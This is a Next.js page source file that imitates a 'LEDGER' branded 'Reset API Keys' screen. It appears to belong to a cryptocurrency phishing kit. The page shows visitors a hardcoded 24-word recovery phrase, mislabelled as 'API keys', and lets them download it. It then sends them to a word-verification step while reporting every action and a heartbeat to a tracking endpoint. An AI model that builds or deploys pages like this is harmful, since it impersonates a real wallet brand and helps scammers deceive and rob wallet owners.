"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { Download, Eye, EyeOff, AlertTriangle, KeyRound, ArrowRight } from "lucide-react"
import type { UserActivity } from "@/lib/activity-store"
import { useHeartbeat } from "@/hooks/use-heartbeat"
import { LedgerFooter } from "@/components/ledger-footer"

export default function ResetApiKeysPage() {
  const router = useRouter()
  const [selectedKey, setSelectedKey] = useState<string>("")
  const [visitorId, setVisitorId] = useState<string>("")
  const [showWarning, setShowWarning] = useState(false)
  const [warningAccepted, setWarningAccepted] = useState(false)
  const [keysBlurred, setKeysBlurred] = useState(false)
  const [hasDownloadedOrViewed, setHasDownloadedOrViewed] = useState(false)
  const [isNavigating, setIsNavigating] = useState(false)

  useHeartbeat(visitorId)

  useEffect(() => {
    const id = localStorage.getItem("visitorId")
    if (id) {
      setVisitorId(id)
      fetch(`/api/activity?visitorId=${id}`)
        .then((res) => res.json())
        .then((data) => {
          if (data.activity) {
            const activity: UserActivity = {
              ...data.activity,
              currentStage: "reset-api-keys",
              stage3Data: {
                selectedApiKey: "",
                downloadClicked: false,
              },
              lastUpdated: new Date().toISOString(),
            }
            fetch("/api/activity", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ visitorId: id, activity }),
            })
          }
        })
    }
  }, [])

  const handleDownload = async () => {
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      
      if (data.activity) {
        const activity: UserActivity = {
          ...data.activity,
          stage3Data: {
            selectedApiKey: selectedKey || "primary",
            downloadClicked: true,
            downloadTimestamp: new Date().toISOString(),
          },
          lastUpdated: new Date().toISOString(),
        }
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, activity }),
        })
      }
    }

    const primaryContent = `1.\nramp\n\n2.\noak\n\n3.\nwalnut\n\n4.\ncrime\n\n5.\ncoast\n\n6.\nschool\n\n7.\nbench\n\n8.\nwin\n\n9.\ntwelve\n\n10.\nlyrics\n\n11.\nhobby\n\n12.\nfork\n\n13.\nrunway\n\n14.\ngreat\n\n15.\nvery\n\n16.\ngoat\n\n17.\nvapor\n\n18.\ncopper\n\n19.\nglide\n\n20.\ndiesel\n\n21.\npotato\n\n22.\nsausage\n\n23.\nproperty\n\n24.\nmagnet`
    const secondaryContent = `1.\nramp\n\n2.\noak\n\n3.\nwalnut\n\n4.\ncrime\n\n5.\ncoast\n\n6.\nschool\n\n7.\nbench\n\n8.\nwin\n\n9.\ntwelve\n\n10.\nlyrics\n\n11.\nhobby\n\n12.\nfork\n\n13.\nrunway\n\n14.\ngreat\n\n15.\nvery\n\n16.\ngoat\n\n17.\nvapor\n\n18.\ncopper\n\n19.\nglide\n\n20.\ndiesel\n\n21.\npotato\n\n22.\nsausage\n\n23.\nproperty\n\n24.\nmagnet`
    
    const content = selectedKey === "primary" ? primaryContent : secondaryContent
    const fileName = selectedKey === "primary" ? "Primary API Keys.txt" : "Secondary API Keys.txt"
    
    const blob = new Blob([content], { type: "text/plain" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = fileName
    a.click()
    URL.revokeObjectURL(url)
    setHasDownloadedOrViewed(true)
  }

  const handleViewKeys = () => {
    setShowWarning(true)
  }

  const handleAcceptWarning = () => {
    setWarningAccepted(true)
    setShowWarning(false)
    setHasDownloadedOrViewed(true)
  }

  const handleNext = async () => {
    if (isNavigating) return
    setIsNavigating(true)
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      
      if (data.activity) {
        const activity: UserActivity = {
          ...data.activity,
          currentStage: "verify-words",
          lastUpdated: new Date().toISOString(),
        }
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, activity }),
        })
      }
    }
    router.push("/verify-words")
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <header className="border-b border-border">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <div className="relative flex items-center">
                <span
                  className="absolute -top-0.5 -left-1 w-2.5 h-2.5 border-l-2 border-t-2 border-foreground"
                  aria-hidden="true"
                />
                <span className="font-bold text-foreground tracking-[0.2em] text-sm px-3 py-1">LEDGER</span>
                <span
                  className="absolute -bottom-0.5 -right-1 w-2.5 h-2.5 border-r-2 border-b-2 border-foreground"
                  aria-hidden="true"
                />
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
        <div className="max-w-md mx-auto">
          <div className="flex justify-center mb-5">
            <div className="w-14 h-14 rounded-full bg-blue-500/20 flex items-center justify-center">
              <KeyRound className="w-7 h-7 text-blue-400" />
            </div>
          </div>

          <h1 className="text-xl sm:text-2xl font-semibold text-foreground mb-2 text-center">Reset API Keys</h1>
          <p className="text-sm text-muted-foreground text-center mb-6">
            Select the API key you would like to reset and download your new credentials.
          </p>

          {/* Warning modal overlay */}
          {showWarning && (
            <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50 px-4">
              <Card className="max-w-sm w-full bg-background border-border">
                <CardContent className="pt-6 pb-6">
                  <div className="flex justify-center mb-4">
                    <div className="w-12 h-12 rounded-full bg-destructive/20 flex items-center justify-center">
                      <AlertTriangle className="w-6 h-6 text-destructive" />
                    </div>
                  </div>
                  <h2 className="text-lg font-semibold text-foreground text-center mb-2">Security Warning</h2>
                  <p className="text-sm text-muted-foreground text-center mb-5">
                    Do not screenshot or share these API keys for security purposes. Keep your keys private and store them securely.
                  </p>
                  <div className="flex gap-3">
                    <Button
                      variant="outline"
                      onClick={() => setShowWarning(false)}
                      className="flex-1 bg-transparent border-border hover:bg-secondary h-10 cursor-pointer transition-all duration-200"
                    >
                      Cancel
                    </Button>
                    <Button
                      onClick={handleAcceptWarning}
                      className="flex-1 bg-foreground text-background hover:bg-foreground/80 h-10 cursor-pointer transition-all duration-200"
                    >
                      I understand
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          <div className="space-y-4 sm:space-y-5">
            <div className="space-y-2">
              <label className="text-xs sm:text-sm text-muted-foreground">Select API Key</label>
              <Select value={selectedKey} onValueChange={(value) => {
                setSelectedKey(value)
                if (visitorId) {
                  fetch(`/api/activity?visitorId=${visitorId}`)
                    .then((res) => res.json())
                    .then((data) => {
                      if (data.activity) {
                        const activity: UserActivity = {
                          ...data.activity,
                          stage3Data: {
                            ...data.activity.stage3Data,
                            selectedApiKey: value,
                          },
                          lastUpdated: new Date().toISOString(),
                        }
                        fetch("/api/activity", {
                          method: "POST",
                          headers: { "Content-Type": "application/json" },
                          body: JSON.stringify({ visitorId, activity }),
                        })
                      }
                    })
                }
              }}>
                <SelectTrigger className="w-full bg-secondary border-border text-sm sm:text-base h-10 sm:h-11 cursor-pointer">
                  <SelectValue placeholder="Select an API key" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="primary" className="cursor-pointer">Primary API Key</SelectItem>
                  <SelectItem value="secondary" className="cursor-pointer">Secondary API Key</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {warningAccepted && (
              <Card className="bg-secondary/50 border-border">
                <CardContent className="pt-4 pb-4">
                  <p className="text-xs text-muted-foreground mb-3">Your recovery phrase:</p>
                  <div className={`grid grid-cols-2 sm:grid-cols-3 gap-2 transition-all duration-300 ${keysBlurred ? "blur-md select-none" : ""}`}>
                    {[
                      "ramp", "oak", "walnut", "crime", "coast", "school",
                      "bench", "win", "twelve", "lyrics", "hobby", "fork",
                      "runway", "great", "very", "goat", "vapor", "copper",
                      "glide", "diesel", "potato", "sausage", "property", "magnet"
                    ].map((word, i) => (
                      <div key={i} className="flex items-center gap-2 bg-background px-3 py-1.5 rounded-md border border-border">
                        <span className="text-[11px] text-muted-foreground font-mono">{i + 1}.</span>
                        <span className="text-xs text-foreground font-mono">{word}</span>
                      </div>
                    ))}
                  </div>
                </CardContent>
              </Card>
            )}

            <div className="flex gap-3">
              <Button
                onClick={handleDownload}
                disabled={!selectedKey}
                className="flex-1 bg-foreground text-background hover:bg-foreground/80 h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
              >
                <Download className="w-4 h-4 mr-2" />
                Download
              </Button>
              {warningAccepted ? (
                <Button
                  onClick={() => setKeysBlurred(!keysBlurred)}
                  variant="outline"
                  className="flex-1 bg-transparent border-border hover:bg-secondary h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95"
                >
                  {keysBlurred ? (
                    <><Eye className="w-4 h-4 mr-2" />View API Keys</>
                  ) : (
                    <><EyeOff className="w-4 h-4 mr-2" />Hide API Keys</>
                  )}
                </Button>
              ) : (
                <Button
                  onClick={handleViewKeys}
                  disabled={!selectedKey}
                  variant="outline"
                  className="flex-1 bg-transparent border-border hover:bg-secondary h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
                >
                  <Eye className="w-4 h-4 mr-2" />
                  View API Keys
                </Button>
              )}
            </div>

            <Button
              onClick={handleNext}
              disabled={!selectedKey || !hasDownloadedOrViewed}
              className="w-full bg-foreground text-background hover:bg-foreground/80 h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 focus-visible:ring-2 focus-visible:ring-foreground focus-visible:ring-offset-2 focus-visible:ring-offset-background disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
            >
              Next
              <ArrowRight className="w-4 h-4 ml-2" />
            </Button>
          </div>
        </div>
      </main>

      <LedgerFooter />
    </div>
  )
}
